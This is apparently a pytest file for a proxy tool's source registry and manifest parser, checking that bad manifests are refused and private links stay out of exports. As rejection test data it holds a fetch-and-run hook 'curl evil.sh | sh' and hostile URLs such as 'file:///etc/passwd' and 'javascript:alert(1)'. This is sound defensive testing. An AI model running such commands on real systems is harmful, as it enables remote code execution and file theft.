"""
Tests for the source registry and the manifest format.
Run:  python -m pytest tests/ -v
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src" / "web"))

import sources as sr  # noqa: E402


class TestRegistry:
    def test_live_types_match_the_subscription_machinery(self):
        # The registry describes types the rest of the code switches on. If the
        # two ever disagree, the interface offers something that silently does
        # nothing, which is the failure this derived value exists to prevent.
        import features as ft
        assert set(sr.LIVE_TYPES) == set(ft.SUBSCRIPTION_TYPES)

    def test_geo_replaces_rather_than_adds(self):
        # xray reads one XRAY_LOCATION_ASSET, so a second geo pair is not a
        # thing that can exist. The registry has to say so.
        assert sr.SOURCE_TYPES["geo"].cardinality == "one"
        assert all(t.cardinality == "many"
                   for n, t in sr.SOURCE_TYPES.items() if n != "geo")

    def test_the_dangerous_types_are_marked_dangerous(self):
        for name in ("egress", "resolver", "recipe"):
            assert sr.SOURCE_TYPES[name].risk == "high", name

    def test_table_is_serialisable(self):
        rows = sr.type_table()
        assert len(rows) == len(sr.SOURCE_TYPES)
        assert {"name", "payload", "consumer", "cardinality", "risk",
                "implemented", "summary"} == set(rows[0])


class TestManifestRejection:
    def test_not_a_manifest(self):
        out, err = sr.parse_manifest({"type": "adblock", "url": "https://x/y"})
        assert out == [] and "shunt" in err[0]

    def test_future_version_is_refused_not_guessed(self):
        out, err = sr.parse_manifest({"shunt": sr.MANIFEST_VERSION + 1,
                                      "type": "adblock", "url": "https://x/y"})
        assert out == []
        assert "Upgrade" in err[0]

    def test_executable_fields_are_named_in_the_refusal(self):
        # Not merely dropped: a publisher must not be able to believe a hook
        # was honoured when it was quietly ignored.
        out, err = sr.parse_manifest({
            "shunt": 1, "type": "adblock", "url": "https://x/y",
            "postinst": "curl evil.sh | sh"})
        assert out == []
        assert "postinst" in err[0] and "cannot carry" in err[0]

    def test_unknown_fields_are_refused(self):
        out, err = sr.parse_manifest({"shunt": 1, "type": "adblock",
                                      "url": "https://x/y", "surprise": 1})
        assert out == [] and "surprise" in err[0]

    def test_non_http_urls(self):
        for bad in ("file:///etc/passwd", "ftp://h/x", "javascript:alert(1)"):
            out, err = sr.parse_manifest({"shunt": 1, "type": "adblock",
                                          "url": bad})
            assert out == [], bad

    def test_declared_but_unimplemented_type_is_honest_about_it(self):
        out, err = sr.parse_manifest({"shunt": 1, "type": "egress",
                                      "url": "https://x/y"})
        assert out == []
        assert "not yet applied" in err[0]

    def test_recipe_cannot_nest(self):
        out, err = sr.parse_manifest({
            "shunt": 1, "type": "recipe", "name": "n",
            "sources": [{"type": "recipe", "url": "https://x/y"}]})
        assert out == []

    def test_a_recipe_is_all_or_nothing(self):
        # One bad entry must not leave the good ones half-applied: the operator
        # approved a whole, and a partial routing change is one nobody saw.
        out, err = sr.parse_manifest({
            "shunt": 1, "type": "recipe", "name": "n", "sources": [
                {"type": "adblock", "url": "https://good/list"},
                {"type": "adblock", "url": "not-a-url"},
            ]})
        assert out == [] and err


class TestManifestAcceptance:
    def test_single_source(self):
        out, err = sr.parse_manifest({
            "shunt": 1, "type": "adblock", "name": "Ads",
            "url": "https://example.org/ads.txt"})
        assert err == []
        assert out == [{"type": "adblock", "name": "Ads",
                        "url": "https://example.org/ads.txt",
                        "schedule": "weekly", "enabled": True}]

    def test_recipe_with_several(self):
        out, err = sr.parse_manifest({
            "shunt": 1, "type": "recipe", "name": "RU split", "sources": [
                {"type": "direct", "url": "https://e.org/ru.txt",
                 "schedule": "daily"},
                {"type": "adblock", "url": "https://e.org/ads.txt",
                 "enabled": False},
            ]})
        assert err == []
        assert [s["type"] for s in out] == ["direct", "adblock"]
        assert out[0]["schedule"] == "daily"
        assert out[1]["enabled"] is False

    def test_name_defaults_to_the_url(self):
        out, _ = sr.parse_manifest({"shunt": 1, "type": "block",
                                    "url": "https://example.org/b.txt"})
        assert out[0]["name"] == "https://example.org/b.txt"


class TestPrivateLinks:
    def test_personal_links_are_recognised(self):
        for url in (
            "https://sub.example.org/link?token=abc123",
            "https://user:pw@example.org/list.txt",
            "https://example.org/sub/9f8a7b6c5d4e3f2a1b0c9d8e7f6a/list",
        ):
            assert sr.looks_private(url), url

    def test_public_links_are_not(self):
        for url in (
            "https://raw.githubusercontent.com/org/repo/main/hosts.txt",
            "https://example.org/lists/ads.txt",
        ):
            assert not sr.looks_private(url), url


class TestExport:
    def _settings(self):
        return {"subscriptions": [
            {"id": "1", "name": "Ads", "url": "https://e.org/ads.txt",
             "type": "adblock", "enabled": True, "schedule": "weekly"},
            {"id": "2", "name": "Mine", "url": "https://e.org/s?token=zzz",
             "type": "direct", "enabled": True, "schedule": "daily"},
        ]}

    def test_personal_links_do_not_leave_the_box(self):
        m = sr.manifest_from_settings(self._settings())
        urls = [s["url"] for s in m["sources"]]
        assert urls == ["https://e.org/ads.txt"]
        assert "Mine" in m["note"]

    def test_they_can_be_included_deliberately(self):
        m = sr.manifest_from_settings(self._settings(), include_private=True)
        assert len(m["sources"]) == 2
        assert "note" not in m

    def test_export_round_trips_through_the_parser(self):
        # The format is only real if what we write is what we can read.
        m = sr.manifest_from_settings(self._settings(), include_private=True)
        out, err = sr.parse_manifest(m)
        assert err == []
        assert [s["url"] for s in out] == [s["url"] for s in m["sources"]]

    def test_unknown_stored_types_are_skipped_not_exported(self):
        s = {"subscriptions": [{"id": "1", "name": "x", "url": "https://e/x",
                                "type": "from-the-future", "enabled": True}]}
        assert sr.manifest_from_settings(s)["sources"] == []
